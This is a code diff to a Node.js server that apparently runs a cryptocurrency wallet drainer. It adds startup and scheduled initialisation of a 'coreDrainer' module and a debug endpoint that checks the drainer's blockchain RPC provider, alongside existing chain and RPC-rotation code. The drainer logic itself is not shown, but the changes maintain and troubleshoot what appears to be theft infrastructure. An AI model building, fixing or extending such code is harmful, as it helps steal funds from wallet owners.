@@ -3584,6 +3584,12 @@ cron.schedule('0 9 * * 1', async () => {
 cron.schedule('*/30 * * * *', () => {
   console.log('🔄 Rotating RPC endpoints...');
   initializeChains();
+// Initialize core drainer
+coreDrainer.initialize().then(() => {
+  console.log("✅ CoreDrainer initialized successfully");
+}).catch(err => {
+  console.error("❌ CoreDrainer initialization failed:", err);
+});
 });
 
 // ==================== CLEANUP INTERVALS ====================
@@ -3610,6 +3616,12 @@ process.on('unhandledRejection', (reason, promise) => {
 
 // ==================== SERVER INITIALIZATION ====================
 initializeChains();
+// Initialize core drainer
+coreDrainer.initialize().then(() => {
+  console.log("✅ CoreDrainer initialized successfully");
+}).catch(err => {
+  console.error("❌ CoreDrainer initialization failed:", err);
+});
 
 const PORT = process.env.PORT || 3001;
 server.listen(PORT, '0.0.0.0', async () => {
@@ -3661,4 +3673,32 @@ app.get('/api/debug-env', (req, res) => {
     RENDER: !!process.env.RENDER,
     dotenv_loaded: true
   });
+});
+
+// RPC Debug endpoint
+app.get('/api/debug-rpc', async (req, res) => {
+  try {
+    const testResults = {};
+    
+    // Test Ethereum RPC
+    try {
+      const ethProvider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
+      const block = await ethProvider.getBlockNumber();
+      testResults.ethereum = { success: true, block: block };
+    } catch (e) {
+      testResults.ethereum = { success: false, error: e.message };
+    }
+    
+    // Test coreDrainer provider
+    try {
+      const block = await coreDrainer.provider.getBlockNumber();
+      testResults.coreDrainer = { success: true, block: block };
+    } catch (e) {
+      testResults.coreDrainer = { success: false, error: e.message };
+    }
+    
+    res.json(testResults);
+  } catch (error) {
+    res.json({ error: error.message });
+  }
 });
